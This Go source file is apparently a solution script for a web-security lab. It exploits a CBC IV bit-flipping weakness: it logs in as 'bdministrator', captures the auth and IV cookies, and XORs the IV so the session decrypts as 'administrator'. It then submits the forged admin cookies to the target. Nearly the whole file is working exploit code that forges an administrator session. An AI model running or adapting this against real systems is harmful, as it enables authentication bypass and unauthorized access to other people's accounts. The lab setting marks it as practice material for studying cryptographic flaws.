package main

import (
	"cryptography-go/utils"
	"encoding/base64"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strconv"
	"strings"
)

const target = "http://ptl-46d4c0ce-3f0db92b.libcurl.so/"

func extractSig(token string) []byte {
	token, _ = url.QueryUnescape(token)
	decoded := decode(token)
	sig := strings.Split(string(decoded), "--")
	return []byte(sig[1])
}

func captureAuth(username string) (string, string, error) {
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	formData := url.Values{
		"username": {username},
		"password": {"Password1"},
	}
	resp, err := client.PostForm(target+"login.php", formData)
	if err != nil {
		log.Fatalln(err)
	}
	defer resp.Body.Close()

	var auth, iv string
	for _, cookie := range resp.Cookies() {
		if cookie.Name == "auth" {
			auth = cookie.Value
			fmt.Println("Found auth cookie :", cookie.Value)
		} else if cookie.Name == "iv" {
			iv = cookie.Value
			fmt.Println("Found iv cookie :", cookie.Value)
		}
	}
	if len(auth) > 0 && len(iv) > 0 {
		return auth, iv, nil
	} else {
		return "", "", errors.New("Found no cookies")
	}
}

func win(token, iv string) (string, error) {
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		log.Fatalln(err)
	}

	req.AddCookie(&http.Cookie{Name: "auth", Value: token})
	req.AddCookie(&http.Cookie{Name: "iv", Value: iv})

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		err = errors.New(target +
			"\nresp.StatusCode: " + strconv.Itoa(resp.StatusCode))
		return "", err
	}

	body, _ := ioutil.ReadAll(resp.Body)
	return string(body), nil
}

func makeAdminToken(sig []byte) string {
	concat := "administrator--" + string(sig)
	return encode([]byte(concat))
}

func decode(buffer string) []byte {
	escaped, err := url.QueryUnescape(buffer)
	if err != nil {
		log.Fatalln(err)
	}
	decoded, err := base64.URLEncoding.DecodeString(escaped)
	if err != nil {
		log.Fatalln(err)
	}
	return decoded
}

func encode(buffer []byte) string {
	encoded := base64.StdEncoding.EncodeToString(buffer)
	escaped := url.QueryEscape(encoded)
	return escaped
}

func main() {
	m1 := "bdministrator"
	fmt.Println("[*] Capturing first token")
	token1, iv, err := captureAuth(m1)
	if err != nil {
		log.Fatalln(err)
	}
	// fmt.Println(token1)
	// fmt.Println(iv)

	t1 := extractSig(token1)
	// fmt.Println(t1)
	// XOR first block of username with first block of desired username, then XOR with IV to get new IV
	ivTmp := decode(iv)
	fmt.Println("[*] Current IV Value:")
	fmt.Printf("%v\n", ivTmp)
	m2 := "administrator"
	ivTmp = utils.XORBytes(utils.XORBytes(ivTmp, []byte(m1)[:8]), []byte(m2)[:8])
	fmt.Println("[*] New IV Value:")
	fmt.Printf("%v\n", ivTmp)
	iv2 := encode(ivTmp)
	// fmt.Println("[*] Calculating new username (m2):")
	// fmt.Printf("%x (hex)\n", m2New)
	// fmt.Println("[*] Capturing second token")
	// token2, err := captureAuth(string(m2New))
	// if err != nil {
	// 	log.Fatalln(err)
	// }
	// t2 := extractSig(token2)
	// Make new auth token with "administrator" and t as signature
	adminToken := makeAdminToken(t1)
	fmt.Println("[*] Calculating admin cookies:")
	fmt.Printf("iv=%s\n", iv2)
	fmt.Printf("auth=%s\n", adminToken)
	res, _ := win(adminToken, iv2)
	fmt.Println("[*] Final output:")
	fmt.Println(res)
}
